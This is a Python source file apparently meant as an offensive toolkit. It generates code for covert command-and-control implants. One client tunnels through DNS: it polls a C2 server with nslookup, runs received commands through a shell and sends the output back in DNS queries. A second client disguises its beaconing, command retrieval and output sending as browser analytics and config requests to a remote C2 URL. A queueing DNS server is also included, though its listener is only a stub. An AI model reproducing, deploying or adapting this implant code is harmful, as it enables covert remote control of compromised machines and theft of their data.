import base64
import socket
import struct
import time
import random
import string
from typing import Dict, List

class DNSTunnelC2:
    """DNS tunneling C2 for covert communication."""
    
    def __init__(self, domain: str = "example.com"):
        self.domain = domain
        self.subdomain_length = 63  # DNS label limit
        
    def generate_dns_client(self, c2_server: str) -> str:
        """Generate DNS tunneling client."""
        
        dns_client = f'''
import socket
import base64
import struct
import time
import random
import string
import subprocess

class DNSTunnelClient:
    def __init__(self, domain="{self.domain}", c2_server="{c2_server}"):
        self.domain = domain
        self.c2_server = c2_server
        self.session_id = ''.join(random.choices(string.ascii_lowercase, k=8))
        
    def encode_command(self, command: str) -> str:
        """Encode command for DNS tunneling."""
        # Base64 encode and chunk
        encoded = base64.b64encode(command.encode()).decode()
        chunks = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
        return chunks
        
    def send_dns_query(self, subdomain: str) -> str:
        """Send DNS query and get response."""
        try:
            # Create DNS query
            query = f"{{subdomain}}.{{self.domain}}"
            
            # Use nslookup for DNS resolution
            result = subprocess.run(
                ["nslookup", query, self.c2_server],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            # Extract response from nslookup output
            if "Name:" in result.stdout:
                # Parse response (simplified)
                return result.stdout
            else:
                return ""
                
        except Exception as e:
            print(f"DNS query failed: {{e}}")
            return ""
    
    def send_command(self, command: str) -> str:
        """Send command via DNS tunnel."""
        chunks = self.encode_command(command)
        responses = []
        
        for i, chunk in enumerate(chunks):
            subdomain = f"{{self.session_id}}{{i:02d}}{{chunk}}"
            response = self.send_dns_query(subdomain)
            responses.append(response)
            time.sleep(random.uniform(1, 3))  # Random delay
            
        return "".join(responses)
    
    def execute_command(self, command: str) -> str:
        """Execute command and send result back."""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = result.stdout + result.stderr
            return self.send_command(output)
            
        except Exception as e:
            return self.send_command(f"Error: {{e}}")
    
    def beacon(self):
        """Main beacon loop."""
        print(f"[+] DNS tunnel client started - Session: {{self.session_id}}")
        
        while True:
            try:
                # Send heartbeat
                heartbeat = f"HEARTBEAT_{{self.session_id}}"
                self.send_dns_query(heartbeat)
                
                # Check for commands
                command_query = f"CMD_{{self.session_id}}"
                response = self.send_dns_query(command_query)
                
                if "COMMAND:" in response:
                    # Extract command from response
                    command = response.split("COMMAND:")[1].split()[0]
                    print(f"[+] Received command: {{command}}")
                    
                    # Execute and send result
                    self.execute_command(command)
                
                # Sleep before next beacon
                time.sleep(random.uniform(30, 60))
                
            except KeyboardInterrupt:
                print("\\n[!] DNS tunnel stopped by user")
                break
            except Exception as e:
                print(f"[!] Beacon error: {{e}}")
                time.sleep(60)

# Start DNS tunnel client
if __name__ == "__main__":
    client = DNSTunnelClient()
    client.beacon()
'''
        
        return dns_client
    
    def generate_dns_server(self) -> str:
        """Generate DNS tunneling server."""
        
        dns_server = f'''
import socket
import base64
import struct
import time
import threading
from typing import Dict

class DNSTunnelServer:
    def __init__(self, domain="{self.domain}", port=53):
        self.domain = domain
        self.port = port
        self.clients = {{}}  # session_id -> client_info
        self.commands = {{}}  # session_id -> command_queue
        
    def decode_dns_query(self, query: str) -> str:
        """Decode DNS query to extract data."""
        try:
            # Remove domain suffix
            if query.endswith(self.domain):
                subdomain = query[:-len(self.domain)-1]
                
                # Extract session and data
                if len(subdomain) > 10:
                    session_id = subdomain[:8]
                    data = subdomain[10:]  # Skip 2-digit chunk number
                    
                    # Base64 decode
                    decoded = base64.b64decode(data + "==").decode()
                    return decoded
                    
        except Exception as e:
            print(f"DNS decode failed: {{e}}")
            
        return ""
    
    def handle_dns_query(self, query: str, client_ip: str) -> str:
        """Handle incoming DNS query."""
        try:
            # Check if it's a heartbeat
            if "HEARTBEAT_" in query:
                session_id = query.split("HEARTBEAT_")[1].split(".")[0]
                self.clients[session_id] = {{
                    'ip': client_ip,
                    'last_seen': time.time(),
                    'status': 'active'
                }}
                print(f"[+] Heartbeat from {{session_id}} ({{client_ip}})")
                return f"{{session_id}}.heartbeat.{{self.domain}}"
            
            # Check if it's a command request
            elif "CMD_" in query:
                session_id = query.split("CMD_")[1].split(".")[0]
                if session_id in self.commands and self.commands[session_id]:
                    command = self.commands[session_id].pop(0)
                    print(f"[+] Sending command to {{session_id}}: {{command}}")
                    return f"COMMAND:{{command}}.{{session_id}}.{{self.domain}}"
                else:
                    return f"NOCOMMAND.{{session_id}}.{{self.domain}}"
            
            # Check if it's data transmission
            else:
                data = self.decode_dns_query(query)
                if data:
                    session_id = query.split(".")[0][:8]
                    print(f"[+] Received data from {{session_id}}: {{data[:50]}}...")
                    return f"ACK.{{session_id}}.{{self.domain}}"
            
            return f"default.{{self.domain}}"
            
        except Exception as e:
            print(f"DNS query handling failed: {{e}}")
            return f"error.{{self.domain}}"
    
    def add_command(self, session_id: str, command: str):
        """Add command to client queue."""
        if session_id not in self.commands:
            self.commands[session_id] = []
        self.commands[session_id].append(command)
        print(f"[+] Command queued for {{session_id}}: {{command}}")
    
    def list_clients(self) -> Dict:
        """List active clients."""
        active_clients = {{}}
        current_time = time.time()
        
        for session_id, client in self.clients.items():
            if current_time - client['last_seen'] < 300:  # 5 minutes
                active_clients[session_id] = client
                
        return active_clients
    
    def start_server(self):
        """Start DNS server."""
        print(f"[+] Starting DNS tunnel server on port {{self.port}}")
        print(f"[+] Domain: {{self.domain}}")
        
        # Note: This is a simplified DNS server
        # In production, you'd use a proper DNS server library
        print("[!] DNS server implementation requires proper DNS library")
        print("[!] Consider using dnslib or similar for full DNS server functionality")

# DNS server usage
if __name__ == "__main__":
    server = DNSTunnelServer()
    
    # Example: Add command for client
    # server.add_command("abc12345", "whoami")
    
    server.start_server()
'''
        
        return dns_server
    
    def generate_http_blend(self, c2_url: str) -> str:
        """Generate HTTP blending for C2 traffic."""
        
        http_blend = f'''
import requests
import base64
import json
import time
import random
import string

class HTTPBlendC2:
    def __init__(self, c2_url="{c2_url}"):
        self.c2_url = c2_url
        self.session = requests.Session()
        self.session.headers.update({{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }})
        
    def encode_data(self, data: str) -> str:
        """Encode data to look like normal web traffic."""
        # Encode as base64 and add to URL parameters
        encoded = base64.b64encode(data.encode()).decode()
        return encoded
        
    def send_data(self, data: str, endpoint: str = "/api/analytics") -> bool:
        """Send data disguised as analytics."""
        try:
            encoded_data = self.encode_data(data)
            
            # Disguise as analytics request
            params = {{
                'id': ''.join(random.choices(string.ascii_lowercase, k=8)),
                'event': 'page_view',
                'data': encoded_data,
                'timestamp': int(time.time()),
                'user_agent': self.session.headers['User-Agent']
            }}
            
            response = self.session.get(
                f"{{self.c2_url}}{{endpoint}}",
                params=params,
                timeout=10
            )
            
            return response.status_code == 200
            
        except Exception as e:
            print(f"HTTP blend failed: {{e}}")
            return False
    
    def receive_command(self, endpoint: str = "/api/config") -> str:
        """Receive command disguised as config request."""
        try:
            # Disguise as config request
            params = {{
                'version': '1.0.0',
                'platform': 'windows',
                'timestamp': int(time.time())
            }}
            
            response = self.session.get(
                f"{{self.c2_url}}{{endpoint}}",
                params=params,
                timeout=10
            )
            
            if response.status_code == 200:
                # Extract command from response
                data = response.json()
                if 'config' in data and 'command' in data['config']:
                    return data['config']['command']
                    
        except Exception as e:
            print(f"Command receive failed: {{e}}")
            
        return ""
    
    def execute_command(self, command: str) -> str:
        """Execute command and send result."""
        try:
            import subprocess
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = result.stdout + result.stderr
            self.send_data(output)
            return output
            
        except Exception as e:
            error_msg = f"Error: {{e}}"
            self.send_data(error_msg)
            return error_msg
    
    def beacon(self):
        """Main beacon loop."""
        print(f"[+] HTTP blend C2 started - URL: {{self.c2_url}}")
        
        while True:
            try:
                # Check for commands
                command = self.receive_command()
                
                if command:
                    print(f"[+] Received command: {{command}}")
                    self.execute_command(command)
                
                # Send heartbeat
                heartbeat = f"HEARTBEAT_{{int(time.time())}}"
                self.send_data(heartbeat, "/api/heartbeat")
                
                # Sleep before next beacon
                time.sleep(random.uniform(30, 60))
                
            except KeyboardInterrupt:
                print("\\n[!] HTTP blend C2 stopped by user")
                break
            except Exception as e:
                print(f"[!] Beacon error: {{e}}")
                time.sleep(60)

# Start HTTP blend C2
if __name__ == "__main__":
    client = HTTPBlendC2()
    client.beacon()
'''
        
        return http_blend 